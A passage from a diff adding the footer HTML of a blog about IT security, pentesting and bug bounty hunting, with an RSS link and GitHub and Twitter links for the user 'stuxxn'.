+              <use xlink:href="/assets/minima-social-icons.svg#rss"></use>
+            </svg><span>Subscribe</span>
+          </a>
+        </p>
+      </div>
+      <div class="footer-col">
+        <p>Posts about IT Security, pentesting and bug bounty hunting.</p>
+      </div>
+    </div>
+
+    <div class="social-links"><ul class="social-media-list"><li>
+  <a rel="me" href="https://github.com/stuxxn" target="_blank" title="github">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#github"></use>
+    </svg>
+  </a>
+</li>
+<li>
+  <a rel="me" href="https://twitter.com/stuxxn" target="_blank" title="twitter">
+    <svg class="svg-icon grey">
+      <use xlink:href="/assets/minima-social-icons.svg#twitter"></use>
+    </svg>
+  </a>
+</li>
+</ul>
+</div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
